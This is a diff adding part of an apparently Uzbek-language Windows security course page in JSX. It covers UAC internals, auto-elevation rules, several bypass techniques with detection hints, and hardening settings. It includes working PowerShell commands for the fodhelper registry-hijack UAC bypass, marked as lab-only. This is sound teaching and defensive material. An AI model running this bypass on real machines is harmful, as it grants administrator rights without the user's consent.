+              <div style={{fontFamily:"var(--font-mono)",fontSize:10,color:"var(--text-3)"}}>{item.sid}</div>
+            </div>
+            <span style={{fontSize:12,color:"var(--text-1)",lineHeight:1.6}}>{item.who}</span>
+          </div>
+        ))}
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.3 — UAC Arxitekturasi: consent.exe va AppInfo</h3>
+      <P>Ko'tarish so'rovi ishga tushganda, oqim quyidagicha:</P>
+      <div style={{display:"flex",flexDirection:"column",gap:6,marginTop:12}}>
+        {[
+          "Foydalanuvchi o'rnatuvchini ikki marta bosadi yoki 'Administrator sifatida ishga tushirish' ni o'ng tugma bosadi",
+          "ShellExecute PE manifestidagi requestedExecutionLevel ni aniqlaydi",
+          "So'rov RPC orqali AppInfo xizmatiga (svchost -k netsvcs / AIS) yuboriladi",
+          "AppInfo tekshiradi: ikkilik fayl imzolangan? Ishonchli katalogda? Manifestda autoElevate bormi?",
+          "AppInfo xavfsiz ish stolida (oddiy jarayonlar kirish imkoni yo'q alohida ish stoli ob'ekti) consent.exe ni chaqiradi",
+          "consent.exe UAC dialogini ko'rsatadi. Foydalanuvchi Ha bosadi yoki hisob ma'lumotlarini kiritadi.",
+          "AppInfo ko'tarilgan token bilan yangi jarayon yaratadi. Asl jarayon filtrlangan token bilan davom etadi.",
+        ].map((step,i)=>(
+          <div key={i} style={{display:"flex",gap:12,alignItems:"flex-start",padding:"8px 12px",borderRadius:6,background:"rgba(255,255,255,0.02)",border:"1px solid var(--border)"}}>
+            <span style={{fontFamily:"var(--font-mono)",fontSize:12,color:"var(--accent)",minWidth:20,flexShrink:0}}>{i+1}.</span>
+            <span style={{fontSize:13,color:"var(--text-1)"}}>{step}</span>
+          </div>
+        ))}
+      </div>
+      <Callout color="var(--c-system)" icon="info" titleUz="Xavfsiz ish stoli UI aldashga qarshi himoya qiladi" titleEn="">
+        consent.exe <em>xavfsiz ish stolida</em> ishlaydi — faqat SYSTEM yoza oladigan alohida Windows ish stoli ob'ekti. O'rta IL dagi zararli dastur xavfsiz ish stolida oynalar chiza olmaydi, sichqoncha bosishlarini kirita olmaydi yoki klaviatura kirishini to'xtatib qo'ya olmaydi. Shuning uchun UAC so'rovi vizual ishonchli hisoblanadi, hatto tizim O'rta IL da buzilgan bo'lsa ham.
+      </Callout>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.4 — Auto-Elevation</h3>
+      <P>Ba'zi Windows ikkilik fayllari UAC so'rovini ko'rsatmasdan jimgina ko'tariladi. Ular BARCHA uch mezonni qondirishi kerak:</P>
+      <div style={{display:"flex",flexDirection:"column",gap:6,marginTop:12}}>
+        {[
+          {crit:"1. Microsoft tomonidan imzolangan",detail:"Ikkilik fayl Microsoft Corporation dan haqiqiy Authenticode imzosiga ega bo'lishi kerak. Uchinchi tomon imzolangan ikkilik fayllar hech qachon auto-elevation qilmaydi."},
+          {crit:"2. Ishonchli katalog",detail:"Ikkilik fayl himoyalangan katalogda bo'lishi kerak: %SystemRoot%\\System32\\, %SystemRoot%\\ yoki %ProgramFiles%\\. Admin yozishi kerak bo'lgan kataloglar — bu soxta ikkilik faylni u yerga tashlashga to'sqinlik qiladi."},
+          {crit:"3. autoElevate manifesti",detail:"Ilova manifesti (PE ga o'rnatilgan yoki yon .manifest faylida) requestedExecutionLevel elementi ichida <autoElevate>true</autoElevate> ni o'z ichiga olishi kerak."},
+        ].map((item,i)=>(
+          <div key={i} style={{display:"flex",gap:14,padding:"10px 14px",borderRadius:8,background:"rgba(0,212,255,0.04)",border:"1px solid rgba(0,212,255,0.2)"}}>
+            <span style={{fontFamily:"var(--font-mono)",fontSize:12,color:"var(--c-system)",minWidth:190,flexShrink:0,fontWeight:700}}>{item.crit}</span>
+            <span style={{fontSize:13,color:"var(--text-1)",lineHeight:1.6}}>{item.detail}</span>
+          </div>
+        ))}
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.5 — UAC Chetlab O'tish Texnikalari</h3>
+      <div style={{display:"flex",flexDirection:"column",gap:12,marginTop:12}}>
+        {[
+          {title:"Registry Hijacking — fodhelper.exe (UACME #41)",color:"var(--c-attack)",body:<><code>fodhelper.exe</code> autoElevate bilan System32 dagi Microsoft imzolangan ikkilik fayl. U ms-settings protokoli uchun ishlovchini topish uchun <code>HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command</code> ni o'qiydi. HKCU foydalanuvchi yoziladigan (ko'tarish talab qilinmaydi) bo'lganligi uchun, hujumchi o'z yuklamasini u yerga yozadi, keyin fodhelper.exe ni ishga tushiradi — u auto-elevation qiladi va yuklamani Yuqori yaxlitlikda bajaradi. Aniqlash: Sysmon Event 13 (HKCU\\Software\\Classes\\ms-settings ostida registry set) so'ngra Event 1 (fodhelper.exe kutilmagan bolani yaratmoqda).</>},
+          {title:"Muhit O'zgaruvchisi Hijacking — SilentCleanup",color:"var(--c-err)",body:<><code>SilentCleanup</code> RunLevel=HighestAvailable (so'rovsiz auto-elevated) bilan joriy foydalanuvchi sifatida ishlaydigan rejalashtirilgan vazifa. U <code>%windir%\\system32\\cleanmgr.exe</code> ni bajaradi. Agar %windir% foydalanuvchi darajasidagi muhit o'zgaruvchisi orqali o'tkazilsa (ko'tarishsiz yoziladigan), vazifa buning o'rniga hujumchining ikkilik faylini ishga tushiradi. Aniqlash: tizim bo'lmagan yo'ldan SilentCleanup yoki schtasks tomonidan jarayon yaratish.</>},
+          {title:"Eventvwr.exe Registry Hijack",color:"var(--c-warn)",body:<><code>eventvwr.exe</code> auto-elevation qiladi va mmc.exe ni topish uchun <code>HKCU\\Software\\Classes\\mscfile\\shell\\open\\command</code> ni o'qiydi. Hujumchi yuklamasini shu HKCU kalitiga yozadi, eventvwr.exe ni ishga tushiradi — yuklamasi Yuqori IL da bajariladi. Bu ko'p dastlabki Metasploit UAC bypass modullarida ishlatilgan texnika edi. Aniqlash: HKCU\\Software\\Classes\\mscfile ga registry yozuvi so'ngra eventvwr.exe bajarilishi.</>},
+          {title:"COM Ob'ektini Ko'tarish (ICMLuaUtil)",color:"var(--c-system)",body:<>Bir qancha COM ob'ektlari aniq ko'tarish monikerи <code>Elevation:Administrator!new:{"{CLSID}"}</code> bilan ro'yxatga olingan. Bu COM ob'ektlari COM ko'tarish monikeri orqali yaratilganida auto-elevation qiladi. ICMLuaUtil interfeysi Yuqori IL da ishlaydigan <code>ShellExec</code> va <code>SetRegistryStringValue</code> usullarini ochib beradi. O'rta IL dan har qanday UAC so'rovsiz chaqirilishi mumkin.</>},
+        ].map((item,i)=>(
+          <div key={i} style={{padding:"14px 16px",borderRadius:10,background:`${item.color}08`,border:`1px solid ${item.color}30`}}>
+            <div style={{fontFamily:"var(--font-display)",fontSize:14,fontWeight:700,color:item.color,marginBottom:8}}>{item.title}</div>
+            <div style={{fontSize:13,color:"var(--text-1)",lineHeight:1.65}}>{item.body}</div>
+          </div>
+        ))}
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — UAC Konfiguratsiya Sozlamalari</h3>
+      <div style={{overflowX:"auto",marginTop:12}}>
+        <table style={{width:"100%",borderCollapse:"collapse",fontSize:13}}>
+          <thead><tr style={{borderBottom:"1px solid var(--border)"}}>
+            {["Registry Qiymati","Ma'nosi"].map(h=><th key={h} style={{textAlign:"left",padding:"8px 12px",color:"var(--text-2)",fontWeight:600}}>{h}</th>)}
+          </tr></thead>
+          <tbody>{[
+            ["ConsentPromptBehaviorAdmin","0=so'rov yo'q; 1=xavfsiz ish stolida hisob ma'lumotlari; 2=xavfsiz ish stolida rozilik (standart); 5=faqat Windows bo'lmagan ikkilik fayllar uchun so'rov"],
+            ["EnableLUA","0=UAC to'liq o'chirilgan (xavfli); 1=UAC yoqilgan (standart). O'chirish token ajratishni olib tashlaydi."],
+            ["LocalAccountTokenFilterPolicy","1=uzoq ulanishlar uchun UAC filtrini o'chirish (admin akkount bilan PtH lateral movement ni yoqadi)"],
+            ["PromptOnSecureDesktop","0=interaktiv ish stolida ko'rsatish (soxtalashtirish mumkin); 1=xavfsiz ish stolida ko'rsatish (standart)"],
+          ].map((r,i)=><tr key={i} style={{borderBottom:"1px solid rgba(255,255,255,0.04)",background:i%2===0?"transparent":"rgba(255,255,255,0.015)"}}>
+            {r.map((c,j)=><td key={j} style={{padding:"7px 12px",color:j===0?"var(--accent)":"var(--text-1)",fontFamily:j===0?"var(--font-mono)":"inherit",fontSize:j===0?11:13}}>{c}</td>)}
+          </tr>)}
+          </tbody>
+        </table>
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.7 — Amaliy Buyruqlar</h3>
+      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Joriy jarayon yaxlitlik darajasini tekshirish
+whoami /groups | findstr "Mandatory Label"
+# → Mandatory Label\\High Mandatory Level = ko'tarilgan
+# → Mandatory Label\\Medium Mandatory Level = ko'tarilmagan
+
+# UAC konfiguratsiyasini tekshirish
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA
+
+# fodhelper UAC bypass (faqat laboratoriyada test qiling)
+New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force
+Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" \`
+  -Name "(default)" -Value "cmd.exe"
+Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" \`
+  -Name "DelegateExecute" -Value ""
+Start-Process "C:\\Windows\\System32\\fodhelper.exe"
+
+# UAC ni mustahkamlash: har doim so'rov (2-daraja)
+Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" \`
+  -Name ConsentPromptBehaviorAdmin -Value 2`}</code></pre>
     </section>
   );
 }
